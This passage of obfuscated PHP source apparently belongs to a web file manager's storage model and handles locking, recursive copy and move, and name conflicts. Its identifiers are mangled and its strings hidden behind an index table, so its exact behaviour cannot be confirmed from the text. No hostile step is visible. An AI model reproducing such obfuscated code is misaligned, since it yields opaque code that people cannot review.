$ÌıÍ˜Å“); $this->_lockKey($îëûâ®Ò, 1); $this->_lockKey($îëûâ®Ò, 0); $£Òì‡“ = array_reverse($this->parentLevelArray($ïƒã±é[$Ë…øòĞÃ[604]])); foreach ($£Òì‡“ as $„¿…³ÚÚ) { $îëûâ®Ò = $°³¸‹¦‹ . $Ë…øòĞÃ[650] . $„¿…³ÚÚ; if (CacheLock::lockGet($Ë…øòĞÃ[651] . $îëûâ®Ò)) { $ïƒã±é = $this->sourceInfo($„¿…³ÚÚ); CacheLock::setErrorMsg($Ë…øòĞÃ[173] . htmlspecialchars($ïƒã±é[$Ë…øòĞÃ[32]]) . $Ë…øòĞÃ[175] . $ÌıÍ˜Å“); $this->_lockKey($îëûâ®Ò, 1); $this->_lockKey($îëûâ®Ò, 0); } } } private function _lockCheckEnd($ç‰­˜ãş, $ğÑªÙ¶) { $ÛØ•šïŠ =& $_SERVER[µÅ˜º…æ]; $†¼‹“§á = $ç‰­˜ãş . $ÛØ•šïŠ[10] . $ğÑªÙ¶; CacheLock::setErrorMsg($ÛØ•šïŠ[463]); if (!isset($this->_lockTimeStart[$†¼‹“§á])) { return; } $ˆ´…¢’ = timeFloat() - $this->_lockTimeStart[$†¼‹“§á]; unset($this->_lockTimeStart[$†¼‹“§á]); if ($ˆ´…¢’ > 0.5) { unset(self::$cacheSourceInfo[$ÛØ•šïŠ[547] . $ğÑªÙ¶]); } $ôÂô§ä¼ = $this->sourceInfo($ğÑªÙ¶); if (!$ôÂô§ä¼) { show_json(LNG($ÛØ•šïŠ[105]), !1); } } private function _lockParent($Ğ«‰Óš², $õ‘ÃÑê, $æúŒ¼·) { if (!$this->autoLockSet) { return; } $è ¡³’İ = $this->sourceInfo($Ğ«‰Óš²); if (!is_array($è ¡³’İ)) { return; } $†Â£Ù£¨ = array_reverse($this->parentLevelArray($è ¡³’İ[$_SERVER[µÅ˜º…æ][604]])); foreach ($†Â£Ù£¨ as $ß·ßªêã) { $this->_lockEvent($ß·ßªêã, $õ‘ÃÑê, $æúŒ¼·); } } private function _lockEvent($‹Ô‰¡’µ, $‘„é½Ñô, $÷Æ·˜˜¿) { $ãœˆÂõ™ =& $_SERVER[µÅ˜º…æ]; if (!$this->autoLockSet) { return; } foreach ($‘„é½Ñô as $×Ú™”˜) { $Ì¾Ì£í = $×Ú™”˜ . $ãœˆÂõ™[10] . $‹Ô‰¡’µ; if ($÷Æ·˜˜¿ && CacheLock::lockGet($ãœˆÂõ™[651] . $Ì¾Ì£í)) { continue; } $this->_lockKey($Ì¾Ì£í, $÷Æ·˜˜¿); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($«ı‹€ùÃ, $–º¾Ù‡Ã = 1) { $Ÿ€¢€· = $_SERVER[µÅ˜º…æ][651] . md5($«ı‹€ùÃ); if ($–º¾Ù‡Ã) { if (isset(self::$_lockItemArr[$Ÿ€¢€·])) { return; } self::$_lockItemArr[$Ÿ€¢€·] = 1; CacheLock::lock($Ÿ€¢€·, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ÿ€¢€·])) { return; } unset(self::$_lockItemArr[$Ÿ€¢€·]); CacheLock::unlock($Ÿ€¢€·); } } public function isParentOf($¨ÄÛÎ¶Ë, $ÃŠØÃË) { $ÀŒà×õÏ =& $_SERVER[µÅ˜º…æ]; $šç¬îÎ¬ = $this->sourceInfo($¨ÄÛÎ¶Ë); $è…‘ÕıŞ = $this->sourceInfo($ÃŠØÃË); $ÂÀ¤õé = $šç¬îÎ¬[$ÀŒà×õÏ[604]] . $šç¬îÎ¬[$ÀŒà×õÏ[191]] . $ÀŒà×õÏ[50]; $ò¢£áÕ = $è…‘ÕıŞ[$ÀŒà×õÏ[604]] . $è…‘ÕıŞ[$ÀŒà×õÏ[191]] . $ÀŒà×õÏ[50]; $Ü‡—Œ‘³ = strpos($ò¢£áÕ, $ÂÀ¤õé) === 0; return $Ü‡—Œ‘³; } private $targetIsDelete = 0; public function copy($¼¬ÒÖ‰Œ, $ÒÍ™, $éßâ÷û = REPEAT_REPLACE, $ÆÊ£à‡‰ = '') { $À€¥½È¢ =& $_SERVER[µÅ˜º…æ]; $•¨ı´ğ = $this->sourceInfo($¼¬ÒÖ‰Œ); $ÂßêØÄ† = $this->sourceInfo($ÒÍ™); if (!$•¨ı´ğ || !$ÂßêØÄ† || $ÂßêØÄ†[$À€¥½È¢[500]] != $À€¥½È¢[91]) { return !1; } if ($this->isParentOf($¼¬ÒÖ‰Œ, $ÒÍ™)) { return !1; } $Íä¾çûí = $ÆÊ£à‡‰ ? $ÆÊ£à‡‰ : $•¨ı´ğ[$À€¥½È¢[32]]; $this->lockCopyStart($¼¬ÒÖ‰Œ); $this->lockWriteStart($ÒÍ™, $Íä¾çûí); $è”ü­³ò = array($À€¥½È¢[652] => array(), $À€¥½È¢[653] => array(), $À€¥½È¢[654] => array()); $this->targetIsDelete = intval($•¨ı´ğ[$À€¥½È¢[520]]); $ÑéÎéÁ = $this->fileNameExistAuto($ÒÍ™, $•¨ı´ğ); $ŞÁ©†Ğì = $this->_copy($¼¬ÒÖ‰Œ, $ÒÍ™, $éßâ÷û, $è”ü­³ò, !0, $ÆÊ£à‡‰); $this->_childrenListClear(); $this->lockCopyEnd($¼¬ÒÖ‰Œ); $this->lockWriteEnd($ÒÍ™, $Íä¾çûí); if ($•¨ı´ğ[$À€¥½È¢[500]] == $À€¥½È¢[91] && $ÑéÎéÁ == $ŞÁ©†Ğì) { $this->folderSizeResetChildren($ÑéÎéÁ); } Model($À€¥½È¢[471])->addAll($è”ü­³ò[$À€¥½È¢[653]], array(), !0); if ($ÑéÎéÁ != $ŞÁ©†Ğì || $•¨ı´ğ[$À€¥½È¢[500]] == $À€¥½È¢[91]) { Model($À€¥½È¢[655])->eventCopy($ŞÁ©†Ğì); } $this->saveAll($è”ü­³ò[$À€¥½È¢[654]]); Model($À€¥½È¢[230])->linkAdd($è”ü­³ò[$À€¥½È¢[652]]); $this->folderSizeReset($ÒÍ™); $this->updateModifyTime($ÒÍ™); return $ŞÁ©†Ğì; } private function _copy($®¸Á­÷, $ãí…ªÑ, $Ÿ£ÃÃı, &$ï‹ô«¶‚, $áŠæµàÛ, $ğ›¡Ã½è = '') { $‰ÁÔ¶Á² =& $_SERVER[µÅ˜º…æ]; $Š‘¬¼Ò = $this->sourceInfoCache($®¸Á­÷); $àĞæõœà = $Š‘¬¼Ò[$‰ÁÔ¶Á²[500]] == $‰ÁÔ¶Á²[91]; $™‡‰½Šš = $ğ›¡Ã½è ? $ğ›¡Ã½è : $Š‘¬¼Ò[$‰ÁÔ¶Á²[32]]; $·áúÚêò = $this->fileNameExistAuto($ãí…ªÑ, $Š‘¬¼Ò); if ($áŠæµàÛ) { $this->_childrenAllMake($®¸Á­÷); if ($àĞæõœà && $·áúÚêò) { $this->_childrenAllMake($·áúÚêò); } } if (!$·áúÚêò) { return $this->_copyCreate($®¸Á­÷, $ãí…ªÑ, $™‡‰½Šš, $ï‹ô«¶‚); } $õÜÅâ¡Ø = $·áúÚêò; if ($àĞæõœà) { if ($Ÿ£ÃÃı == REPEAT_RENAME_FOLDER) { $™‡‰½Šš = $this->fileNameAutoCache($ãí…ªÑ, $™‡‰½Šš, $Ÿ£ÃÃı, $àĞæõœà); $õÜÅâ¡Ø = $this->_copyCreate($®¸Á­÷, $ãí…ªÑ, $™‡‰½Šš, $ï‹ô«¶‚); } else { $É„ö­Ö­ = $this->_childrenList($®¸Á­÷); foreach ($É„ö­Ö­ as $×Ö•ôã¨) { $this->_copy($×Ö•ôã¨[$‰ÁÔ¶Á²[191]], $·áúÚêò, $Ÿ£ÃÃı, $ï‹ô«¶‚, !1); } } } else { if ($Ÿ£ÃÃı == REPEAT_RENAME || $Ÿ£ÃÃı == REPEAT_RENAME_FOLDER) { $™‡‰½Šš = $this->fileNameAutoCache($ãí…ªÑ, $™‡‰½Šš, $Ÿ£ÃÃı, $àĞæõœà); $õÜÅâ¡Ø = $this->_copyCreate($®¸Á­÷, $ãí…ªÑ, $™‡‰½Šš, $ï‹ô«¶‚); } else { if ($Ÿ£ÃÃı == REPEAT_REPLACE) { $‚¯é‘—Ö = $this->sourceInfoCache($·áúÚêò); $¹şÍ·›İ = $this->fileHistory($‚¯é‘—Ö, $Š‘¬¼Ò[$‰ÁÔ¶Á²[557]], $Š‘¬¼Ò[$‰ÁÔ¶Á²[79]]); if ($¹şÍ·›İ) { $ï‹ô«¶‚[$‰ÁÔ¶Á²[652]][] = $Š‘¬¼Ò[$‰ÁÔ¶Á²[557]]; } } else { if ($Ÿ£ÃÃı == REPEAT_SKIP) { } } } Hook::trigger($‰ÁÔ¶Á²[656], array($‰ÁÔ¶Á²[657], $Š‘¬¼Ò, 0)); } return $õÜÅâ¡Ø; } private function _copyCreate($ı®—¤ÍÄ, $‰¬‰˜‰¬, $ô‡ÓÔ§Æ, &$ƒ’©æ«) { $çâ‹÷˜‹ =& $_SERVER[µÅ˜º…æ]; $­æôŠÙİ = $this->sourceInfoCache($ı®—¤ÍÄ); $½Ì†³•ß = $this->sourceInfoCache($‰¬‰˜‰¬); $¦”Õ¶ˆ’ = $this->_makeItemData($­æôŠÙİ, $½Ì†³•ß, $ô‡ÓÔ§Æ); Hook::trigger($çâ‹÷˜‹[658], $¦”Õ¶ˆ’); Hook::trigger($çâ‹÷˜‹[659], array($çâ‹÷˜‹[660], $¦”Õ¶ˆ’, 0)); $ö¤ÔÉÊ» = $this->add($¦”Õ¶ˆ’); $…–­à¸ü = array($çâ‹÷˜‹[191] => $ö¤ÔÉÊ», $çâ‹÷˜‹[32] => $ô‡ÓÔ§Æ); $this->_copyApplyMeta($…–­à¸ü, $ƒ’©æ«); if ($­æôŠÙİ[$çâ‹÷˜‹[500]] != $çâ‹÷˜‹[91]) { $ƒ’©æ«[$çâ‹÷˜‹[652]][] = $­æôŠÙİ[$çâ‹÷˜‹[557]]; return $ö¤ÔÉÊ»; } $Çõ¡Å³ = array(); $Ñ¦Õ§Ã– = array(); $this->_childrenListAll($ı®—¤ÍÄ, $Çõ¡Å³); $¦ùÏğÙ = count($Çõ¡Å³); if ($¦ùÏğÙ == 0) { return $ö¤ÔÉÊ»; } $í…‘Ş¤Æ = $this->sourceInfo($ö¤ÔÉÊ»); foreach ($Çõ¡Å³ as $€¤ÀóÙ) { $ÚÕ¸×‡¶ = $this->_makeItemData($€¤ÀóÙ, $í…‘Ş¤Æ, $€¤ÀóÙ[$çâ‹÷˜‹[32]]); $ÚÕ¸×‡¶[$çâ‹÷˜‹[604]] = $€¤ÀóÙ[$çâ‹÷˜‹[604]]; $Ñ¦Õ§Ã–[] = $ÚÕ¸×‡¶; } $this->chunkEventSet($çâ‹÷˜‹[661], array($çâ‹÷˜‹[662], $¦”Õ¶ˆ’, $¦ùÏğÙ)); $this->addAll($Ñ¦Õ§Ã–, array(), !1); $¦€£öëÑ = $this->where(array($çâ‹÷˜‹[190] => $ö¤ÔÉÊ»))->select(); $—˜ÑùõÍ = $this->_childrenMakeRelation($Çõ¡Å³, $¦€£öëÑ); $—˜ÑùõÍ[$ı®—¤ÍÄ] = $ö¤ÔÉÊ»; $šúïß—Ã = array(); $Ìî úñ’ = array(); foreach ($¦€£öëÑ as $€¤ÀóÙ) { $±Éê¹ê = $€¤ÀóÙ[$çâ‹÷˜‹[191]]; $§ûÑÛóŠ = $this->_childrenMatch($—˜ÑùõÍ, $€¤ÀóÙ, $í…‘Ş¤Æ); $šúïß—Ã[] = array($çâ‹÷˜‹[191], $±Éê¹ê, $çâ‹÷˜‹[190], $§ûÑÛóŠ[$çâ‹÷˜‹[190]]); $Ìî úñ’[] = array($çâ‹÷˜‹[191], $±Éê¹ê, $çâ‹÷˜‹[604], $§ûÑÛóŠ[$çâ‹÷˜‹[604]]); $this->_copyApplyMeta($€¤ÀóÙ, $ƒ’©æ«); if ($€¤ÀóÙ[$çâ‹÷˜‹[500]] != $çâ‹÷˜‹[91]) { $ƒ’©æ«[$çâ‹÷˜‹[652]][] = $€¤ÀóÙ[$çâ‹÷˜‹[557]]; } } $this->chunkEventSet($çâ‹÷˜‹[663], array($çâ‹÷˜‹[664], $¦”Õ¶ˆ’, $¦ùÏğÙ)); $this->saveAll($šúïß—Ã); $this->chunkEventSet($çâ‹÷˜‹[665], array($çâ‹÷˜‹[666], $¦”Õ¶ˆ’, $¦ùÏğÙ)); $this->saveAll($Ìî úñ’); return $ö¤ÔÉÊ»; } private function _childrenMakeRelation($³ï„ŠİÍ, $˜ªš¬Ù›) { $Ñ­±±®­ =& $_SERVER[µÅ˜º…æ]; $™Ëñ”€ = array(); $¨ÏìÇ­† = array(); foreach ($³ï„ŠİÍ as $ßˆóÙ¹) { $÷êœ¨ş… = $ßˆóÙ¹[$Ñ­±±®­[32]] . $Ñ­±±®­[8] . $ßˆóÙ¹[$Ñ­±±®­[604]]; $™Ëñ”€[$÷êœ¨ş…] = $ßˆóÙ¹[$Ñ­±±®­[191]]; } foreach ($˜ªš¬Ù› as $ßˆóÙ¹) { $÷êœ¨ş… = $ßˆóÙ¹[$Ñ­±±®­[32]] . $Ñ­±±®­[8] . $ßˆóÙ¹[$Ñ­±±®­[604]]; $Ü³ƒ£“« = $™Ëñ”€[$÷êœ¨ş…]; $¨ÏìÇ­†[$Ü³ƒ£“«] = $ßˆóÙ¹[$Ñ­±±®­[191]]; } return $¨ÏìÇ­†; } private function _childrenMatch($ûÎ›î­, $îíŞ§ùÒ, $ñôã–ï) { $Ì­é“ƒ† =& $_SERVER[µÅ˜º…æ]; $³‘àúğ = $ñôã–ï[$Ì­é“ƒ†[604]]; $üúæåñ¸ = $this->parentLevelArray($îíŞ§ùÒ[$Ì­é“ƒ†[604]]); foreach ($üúæåñ¸ as $œÛ…Ÿ‹) { if (isset($ûÎ›î­[$œÛ…Ÿ‹])) { $³‘àúğ .= $ûÎ›î­[$œÛ…Ÿ‹] . $Ì­é“ƒ†[667]; } } $³‘àúğ = rtrim($³‘àúğ, $Ì­é“ƒ†[50]) . $Ì­é“ƒ†[50]; $µÕòëåÀ = $this->parentLevelArray($³‘àúğ); $®ç½£Îí = $µÕòëåÀ[count($µÕòëåÀ) - 1]; return array($Ì­é“ƒ†[190] => $®ç½£Îí, $Ì­é“ƒ†[604] => $³‘àúğ); } private function _makeItemData($ãÈ¿©ÂŒ, $Œ±Ø¨Åô, $…ØŠìÌŸ) { $—Â¨Úõœ =& $_SERVER[µÅ˜º…æ]; $™ûƒ²Å = array($—Â¨Úõœ[668] => $ãÈ¿©ÂŒ[$—Â¨Úõœ[500]], $—Â¨Úõœ[509] => $…ØŠìÌŸ, $—Â¨Úõœ[669] => $ãÈ¿©ÂŒ[$—Â¨Úõœ[501]] ? $ãÈ¿©ÂŒ[$—Â¨Úõœ[501]] : $—Â¨Úõœ[12], $—Â¨Úõœ[558] => $ãÈ¿©ÂŒ[$—Â¨Úõœ[557]] ? $ãÈ¿©ÂŒ[$—Â¨Úõœ[557]] : 0, $—Â¨Úõœ[640] => $ãÈ¿©ÂŒ[$—Â¨Úõœ[79]] ? $ãÈ¿©ÂŒ[$—Â¨Úõœ[79]] : 0, $—Â¨Úõœ[670] => intval($Œ±Ø¨Åô[$—Â¨Úõœ[188]]), $—Â¨Úõœ[671] => intval($Œ±Ø¨Åô[$—Â¨Úõœ[589]]), $—Â¨Úõœ[672] => intval(USER_ID), $—Â¨Úõœ[673] => intval(USER_ID), $—Â¨Úõœ[492] => intval($Œ±Ø¨Åô[$—Â¨Úõœ[191]]), $—Â¨Úõœ[674] => $Œ±Ø¨Åô[$—Â¨Úõœ[604]] . $Œ±Ø¨Åô[$—Â¨Úõœ[191]] . $—Â¨Úõœ[50], $—Â¨Úõœ[513] => $ãÈ¿©ÂŒ[$—Â¨Úõœ[88]] ? $ãÈ¿©ÂŒ[$—Â¨Úõœ[88]] : time(), $—Â¨Úõœ[519] => 0, $—Â¨Úõœ[675] => $—Â¨Úõœ[12]); return $™ûƒ²Å; } private function _copyApplyMeta($‹Í¸¥Ï”, &$ÜüÌ¬Áé) { $µò á£± =& $_SERVER[µÅ˜º…æ]; $Ê™åê·Í = $‹Í¸¥Ï”[$µò á£±[191]]; $›ÎóÏŞã = $‹Í¸¥Ï”[$µò á£±[32]]; if (!isset($‹Í¸¥Ï”[$µò á£±[676]]) || !$‹Í¸¥Ï”[$µò á£±[676]] || $‹Í¸¥Ï”[$µò á£±[676]] == $µò á£±[228]) { $ÜüÌ¬Áé[$µò á£±[654]][] = array($µò á£±[191], $Ê™åê·Í, $µò á£±[676], short_id($Ê™åê·Í)); } if (Input::check($›ÎóÏŞã, $µò á£±[677])) { $ÜüÌ¬Áé[$µò á£±[653]][] = array($µò á£±[191] => $Ê™åê·Í, $µò á£±[95] => $µò á£±[552], $µò á£±[451] => str_replace($µò á£±[53], $µò á£±[12], Pinyin::get($›ÎóÏŞã))); $ÜüÌ¬Áé[$µò á£±[653]][] = array($µò á£±[191] => $Ê™åê·Í, $µò á£±[95] => $µò á£±[551], $µò á£±[451] => Pinyin::get($›ÎóÏŞã, $µò á£±[678])); } $ÜüÌ¬Áé[$µò á£±[653]][] = array($µò á£±[191] => $Ê™åê·Í, $µò á£±[95] => $µò á£±[531], $µò á£±[451] => KodSort::makeStr($›ÎóÏŞã)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ëÀ›…©‰) { $âŸ‹™´Á =& $_SERVER[µÅ˜º…æ]; $“şĞ…Æ = $this->sourceInfo($ëÀ›…©‰); $ùÛ­¹Á¸ = $âŸ‹™´Á[679]; $ÄĞ´“À = array($âŸ‹™´Á[604] => array($âŸ‹™´Á[635], $“şĞ…Æ[$âŸ‹™´Á[604]] . $ëÀ›…©‰ . $âŸ‹™´Á[636]), $âŸ‹™´Á[520] => $this->targetIsDelete); $„•›øŸ£ = $this->field($ùÛ­¹Á¸)->where($ÄĞ´“À)->select(); if (!$„•›øŸ£) { return; } $„•›øŸ£ = array_to_keyvalue($„•›øŸ£, $âŸ‹™´Á[191]); foreach ($„•›øŸ£ as $¼í¾ó€î) { $˜·ğ«À = $¼í¾ó€î[$âŸ‹™´Á[190]]; $ëÀ›…©‰ = $¼í¾ó€î[$âŸ‹™´Á[191]]; if (!isset($this->_childrenListCache[$ëÀ›…©‰]) && $¼í¾ó€î[$âŸ‹™´Á[500]] == $âŸ‹™´Á[91]) { $this->_childrenListCache[$ëÀ›…©‰] = array(); } if (!isset($this->_childrenListCache[$˜·ğ«À])) { $this->_childrenListCache[$˜·ğ«À] = array(); } $this->_childrenListCache[$˜·ğ«À][$ëÀ›…©‰] = $¼í¾ó€î; $this->_childrenItemCache[$ëÀ›…©‰] = $¼í¾ó€î; } } private function _childrenListAll($íªä—¾“, &$ØÏ£ã®ó) { $½˜¶âº =& $_SERVER[µÅ˜º…æ]; if (!isset($this->_childrenListCache[$íªä—¾“])) { return; } $Î¬Ì€Ê¥ = $this->_childrenListCache[$íªä—¾“]; foreach ($Î¬Ì€Ê¥ as $¹†“Äè‚ => $¹äÌãÑ…) { $ØÏ£ã®ó[$¹†“Äè‚] = $¹äÌãÑ…; if ($¹äÌãÑ…[$½˜¶âº[500]] == $½˜¶âº[91]) { $this->_childrenListAll($¹†“Äè‚, $ØÏ£ã®ó); } } } private function sourceInfoCache($²Õ‘œş¥) { if (isset($this->_childrenItemCache[$²Õ‘œş¥])) { return $this->_childrenItemCache[$²Õ‘œş¥]; } return $this->sourceInfo($²Õ‘œş¥); } private function _childrenList($ß¾Ëõ×) { if (isset($this->_childrenListCache[$ß¾Ëõ×])) { return $this->_childrenListCache[$ß¾Ëõ×]; } return $this->_childrenListSelect($ß¾Ëõ×); } private function _childrenListSelect($ª«¡âÇ) { $æÔÓ·Ê“ =& $_SERVER[µÅ˜º…æ]; $ ßˆ¼¥‹ = array($æÔÓ·Ê“[190] => $ª«¡âÇ, $æÔÓ·Ê“[520] => $this->targetIsDelete); $¨êÙ–â = $this->where($ ßˆ¼¥‹)->select(); $¨êÙ–â = $¨êÙ–â ? $¨êÙ–â : array(); $†Ÿè©›¥ = array_to_keyvalue($¨êÙ–â, $æÔÓ·Ê“[191]); $this->_childrenListCache[$ª«¡âÇ] = $†Ÿè©›¥; foreach ($†Ÿè©›¥ as $ª«¡âÇ => $·ÏÉ±¥Æ) { $this->_childrenItemCache[$ª«¡âÇ] = $·ÏÉ±¥Æ; } return $†Ÿè©›¥; } private function fileNameExistAuto($ş·½Ä—Õ, $ô¥åÆò) { $ŸÃŸï…ş =& $_SERVER[µÅ˜º…æ]; if ($ô¥åÆò[$ŸÃŸï…ş[520]] == $ŸÃŸï…ş[91]) { return $this->fileNameExist($ş·½Ä—Õ, $ô¥åÆò[$ŸÃŸï…ş[32]]); } return $this->fileNameExistCache($ş·½Ä—Õ, $ô¥åÆò[$ŸÃŸï…ş[32]]); } private function fileNameExistCache($ÊŞÄÑ¶, $áÂµ¶ø¡) { $î‚ô¸ÃĞ =& $_SERVER[µÅ˜º…æ]; $áÂµ¶ø¡ = strtolower($áÂµ¶ø¡); $¨ÂÎ‡¨² = $this->_childrenList($ÊŞÄÑ¶); foreach ($¨ÂÎ‡¨² as $àÉ©¦‰à) { if ($áÂµ¶ø¡ == strtolower($àÉ©¦‰à[$î‚ô¸ÃĞ[32]])) { return $àÉ©¦‰à[$î‚ô¸ÃĞ[191]]; } } return !1; } private function fileNameAutoCache($©Íûİ, $š×•”Ùı, $ê÷úø«Ì, $ş›Ñğ½ë) { $»…±æßÍ =& $_SERVER[µÅ˜º…æ]; $ĞŒ›ªú… = $this->_childrenList($©Íûİ); $ŞÒÄáøÜ = array_to_keyvalue($ĞŒ›ªú…, $»…±æßÍ[12], $»…±æßÍ[32]); return $this->fileNameAutoGet($ŞÒÄáøÜ, $š×•”Ùı, $ê÷úø«Ì, $ş›Ñğ½ë); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($æÕè½ğæ, $á°„‘’í, $®ˆªó“¥ = REPEAT_REPLACE, $Æ…Ø¨”¯ = '') { $¶¥œë€Ö =& $_SERVER[µÅ˜º…æ]; $ÙÚÃˆÃ¹ = $this->sourceInfo($æÕè½ğæ); $½ûüô¥Î = $this->sourceInfo($á°„‘’í); if ($ÙÚÃˆÃ¹[$¶¥œë€Ö[190]] == $½ûüô¥Î[$¶¥œë€Ö[191]]) { if ($ÙÚÃˆÃ¹[$¶¥œë€Ö[520]] == $¶¥œë€Ö[91]) { Model($¶¥œë€Ö[518])->restore(array($æÕè½ğæ)); } if (!$Æ…Ø¨”¯ || $Æ…Ø¨”¯ == $ÙÚÃˆÃ¹[$¶¥œë€Ö[32]]) { return $æÕè½ğæ; } } $¾±¤ô = $this->pathInfoMore($æÕè½ğæ); if ($this->isParentOf($æÕè½ğæ, $á°„‘’í)) { return !1; } if (!$ÙÚÃˆÃ¹ || !$½ûüô¥Î || $½ûüô¥Î[$¶¥œë€Ö[500]] != $¶¥œë€Ö[91]) { return !1; } Hook::trigger($¶¥œë€Ö[680], $¾±¤ô); $this->targetIsDelete = intval($ÙÚÃˆÃ¹[$¶¥œë€Ö[520]]); if ($ÙÚÃˆÃ¹[$¶¥œë€Ö[190]] == $á°„‘’í && $Æ…Ø¨”¯ != $ÙÚÃˆÃ¹[$¶¥œë€Ö[32]]) { $›¢Ä…¦ƒ = $this->fileNameExist($á°„‘’í, $Æ…Ø¨”¯); if ($›¢Ä…¦ƒ && $ÙÚÃˆÃ¹[$¶¥œë€Ö[500]] == $¶¥œë€Ö[228]) { $ø¢ÙÛËÌ = $this->sourceInfo($›¢Ä…¦ƒ); $‘Ôò–¯ = $this->fileHistory($ø¢ÙÛËÌ, $ÙÚÃˆÃ¹[$¶¥œë€Ö[557]], $ÙÚÃˆÃ¹[$¶¥œë€Ö[79]]); if (!$‘Ôò–¯) { Model($¶¥œë€Ö[560])->remove($ÙÚÃˆÃ¹[$¶¥œë€Ö[557]]); } $this->removeNow($æÕè½ğæ, !1); $this->folderSizeReset($á°„‘’í); Hook::trigger($¶¥œë€Ö[681], $¾±¤ô); return $›¢Ä…¦ƒ; } } $ùçÀ€ß = $Æ…Ø¨”¯ ? $Æ…Ø¨”¯ : $ÙÚÃˆÃ¹[$¶¥œë€Ö[32]]; $this->lockMoveStart($æÕè½ğæ); $this->lockWriteStart($á°„‘’í, $ùçÀ€ß); $ã‰–¡ÒŸ = array($¶¥œë€Ö[652] => array(), $¶¥œë€Ö[682] => !1); $this->clearShare($æÕè½ğæ, $á°„‘’í); $ñŸ„ï = $this->fileNameExistAuto($á°„‘’í, $ÙÚÃˆÃ¹); $¦Û¦†œÉ = $this->_move($æÕè½ğæ, $á°„‘’í, $®ˆªó“¥, $ã‰–¡ÒŸ, $Æ…Ø¨”¯); $this->sourceCacheClear(); if ($ÙÚÃˆÃ¹[$¶¥œë€Ö[500]] == $¶¥œë€Ö[91] && $ñŸ„ï) { $this->folderSizeResetChildren($¦Û¦†œÉ); } Model($¶¥œë€Ö[230])->linkAdd($ã‰–¡ÒŸ[$¶¥œë€Ö[652]]); if ($¦Û¦†œÉ && $ñŸ„ï && $ã‰–¡ÒŸ[$¶¥œë€Ö[682]]) { $È°ìäö³ = $ÙÚÃˆÃ¹[$¶¥œë€Ö[500]] == $¶¥œë€Ö[91] ? $this->_childrenListSelect($æÕè½ğæ) : !1; $¡´Úù²í = $È°ìäö³ && count($È°ìäö³) > 0 ? !0 : !1; $this->removeNow($æÕè½ğæ, $¡´Úù²í); } $this->lockMoveEnd($æÕè½ğæ); $this->lockWriteEnd($á°„‘’í, $ùçÀ€ß); $this->folderSizeReset($ÙÚÃˆÃ¹[$¶¥œë€Ö[190]]); $this->folderSizeReset($á°„‘’í); $¯ñé¢Ÿ = array($ÙÚÃˆÃ¹[$¶¥œë€Ö[190]], $á°„‘’í); if ($ÙÚÃˆÃ¹[$¶¥œë€Ö[500]] == $¶¥œë€Ö[91]) { $¯ñé¢Ÿ[] = $æÕè½ğæ; } $this->updateModifyTime($¯ñé¢Ÿ); Model($¶¥œë€Ö[655])->eventMove($æÕè½ğæ, $ÙÚÃˆÃ¹[$¶¥œë€Ö[190]], $á°„‘’í); Hook::trigger($¶¥œë€Ö[681], $¾±¤ô); return $¦Û¦†œÉ; } private function _move($å™‹Óë, $äë¶Ú®, $ïıÏ›Ü„, &$÷Â“õ‚Õ, $½ºìäòó = '') { $İĞÅúÕ‡ =& $_SERVER[µÅ˜º…æ]; $öï€ˆŒÔ = $this->sourceInfo($å™‹Óë); $»è»¹¨© = $öï€ˆŒÔ[$İĞÅúÕ‡[500]] == $İĞÅúÕ‡[91]; $—ô¥ó©Ÿ = $½ºìäòó ? $½ºìäòó : $öï€ˆŒÔ[$İĞÅúÕ‡[32]]; $—¨±Ò¹™ = $this->fileNameExistAuto($äë¶Ú®, $öï€ˆŒÔ); $this->lockMoveStart($å™‹Óë); $this->lockWriteStart($äë¶Ú®, $—ô¥ó©Ÿ); if (!$—¨±Ò¹™) { return $this->_moveForce($å™‹Óë, $äë¶Ú®, $—ô¥ó©Ÿ); } $È¹Â§Êò = $—¨±Ò¹™; $úô„ËĞ· = !1; if ($»è»¹¨©) { if ($ïıÏ›Ü„ == REPEAT_RENAME_FOLDER) { $—ô¥ó©Ÿ = $this->fileNameAuto($äë¶Ú®, $—ô¥ó©Ÿ, $ïıÏ›Ü„, $»è»¹¨©); $È¹Â§Êò = $this->_moveForce($å™‹Óë, $äë¶Ú®, $—ô¥ó©Ÿ); } else { $âÁÈ³ß = $this->_childrenListSelect($å™‹Óë); foreach ($âÁÈ³ß as $Æµì ÃÃ) { $‘ë’¼”‹ = REPEAT_REPLACE; $this->_move($Æµì ÃÃ[$İĞÅúÕ‡[191]], $—¨±Ò¹™, $‘ë’¼”‹, $÷Â“õ‚Õ); } $úô„ËĞ· = !0; } } else { if ($ïıÏ›Ü„ == REPEAT_RENAME || $ïıÏ›Ü„ == REPEAT_RENAME_FOLDER) { $—ô¥ó©Ÿ = $this->fileNameAuto($äë¶Ú®, $—ô¥ó©Ÿ, $ïıÏ›Ü„, $»è»¹¨©); $È¹Â§Êò = $this->_moveForce($å™‹Óë, $äë¶Ú®, $—ô¥ó©Ÿ); } else { $ò¢´°£ = $this->sourceInfoCache($—¨±Ò¹™); $äË¥Şš£ = $this->fileHistory($ò¢´°£, $öï€ˆŒÔ[$İĞÅúÕ‡[557]], $öï€ˆŒÔ[$İĞÅúÕ‡[79]]); if ($äË¥Şš£) { $÷Â“õ‚Õ[$İĞÅúÕ‡[652]][] = $öï€ˆŒÔ[$İĞÅúÕ‡[557]]; } $úô„ËĞ· = !0; } } if ($úô„ËĞ·) { $÷Â“õ‚Õ[$İĞÅúÕ‡[682]] = !0; } return $È¹Â§Êò; } private function _moveForce($ãğ…åÓá, $“¥ÁéÕÄ, $àÕ×ìõØ) { $Ûş¨·ŠÊ =& $_SERVER[µÅ˜º…æ]; $»À¿ÇÙ = $this->sourceInfo($ãğ…åÓá); $ãÔËº‚Ì = $this->sourceInfo($“¥ÁéÕÄ); $”Â¹Á¡ş = $»À¿ÇÙ[$Ûş¨·ŠÊ[500]] == $Ûş¨·ŠÊ[91]; $¢£û™úè = array($Ûş¨·ŠÊ[492] => $ãÔËº‚Ì[$Ûş¨·ŠÊ[191]], $Ûş¨·ŠÊ[674] => $ãÔËº‚Ì[$Ûş¨·ŠÊ[604]] . $ãÔËº‚Ì[$Ûş¨·ŠÊ[191]] . $Ûş¨·ŠÊ[50], $Ûş¨·ŠÊ[670] => $ãÔËº‚Ì[$Ûş¨·ŠÊ[188]], $Ûş¨·ŠÊ[671] => 